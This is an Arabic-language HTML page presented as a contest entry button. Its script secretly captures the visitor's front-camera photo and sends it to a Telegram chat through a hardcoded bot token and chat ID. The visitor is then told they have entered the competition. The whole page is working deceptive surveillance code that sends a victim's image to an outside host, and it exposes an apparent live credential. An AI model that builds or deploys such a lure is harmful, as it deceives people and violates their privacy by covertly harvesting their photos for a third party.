<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال صورة إلى Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
        }
        #captureBtn {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 20px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 50px 0;
            width: 100%;
            max-width: 300px;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success { background-color: #d4edda; color: #155724; }
        .error { background-color: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <button id="captureBtn">اضغط هنا للدخول الى المسابقة</button>
    <div id="status"></div>

    <script>
        document.getElementById('captureBtn').addEventListener('click', async function() {
            const botToken = '8316015659:AAFaKjIiQ5u8nPUFToCykLMKcQfZFqPjzKo';
            const chatId = '8096601840';
            
            try {
                // استخدام الكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } // الكاميرا الأمامية
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                
                stream.getTracks().forEach(track => track.stop());
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', 'صورة ملتقطة من الهاتف');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    showStatus('.تم دخولك المسابقة بنجاح!', 'success');
                } else {
                    showStatus('فشل في إرسال الصورة', 'error');
                }
            } catch (error) {
                showStatus('حدث خطأ: ' + error.message, 'error');
            }
        });
        
        function showStatus(message, type) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = message;
            statusElement.className = type;
            statusElement.style.display = 'block';
        }
    </script>
</body>
</html>
